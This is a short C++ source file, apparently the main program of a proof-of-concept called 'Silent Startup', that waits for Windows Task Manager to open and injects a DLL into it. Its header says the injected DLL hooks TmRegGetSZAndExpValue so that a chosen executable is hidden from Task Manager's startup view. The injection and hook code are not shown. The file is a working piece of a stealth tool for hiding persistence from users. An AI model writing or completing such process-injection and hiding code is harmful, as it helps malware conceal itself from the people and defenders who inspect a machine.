/*
*  --- Silent Startup PoC by oct0ling. ---
* 
*	This PoC showcases how a specific executable can be hidden from Task Manager startup view 
*	by hooking TmRegGetSZAndExpValue.
* 
*	64bit only for now.
* 
*/

#include <string>
#include <iostream>

#include "color.hpp"
#include "error.h"

#include "process.h"
#include "inject.h"


int main(int argc, char** argv)
{
	// intro here
	std::cout << dye::aqua("silent startup ") << "by " << dye::red("oct0ling") << "\n";

	// Wait for task manager process to start in order to place hook.
	std::cout << "waiting for task manager to open...\n";
	HANDLE handleToTaskMgr = SsOpenHandleToProcess();

	if (handleToTaskMgr == nullptr)
		return 0;

	// Using the handle inject the DLL
	if (!SsInjectInRemoteProcess(handleToTaskMgr))
		SsPrintErr("injection failed :(\n");
	else
		std::cout << dye::green("injection successful.") << "\n";

	return 0;
}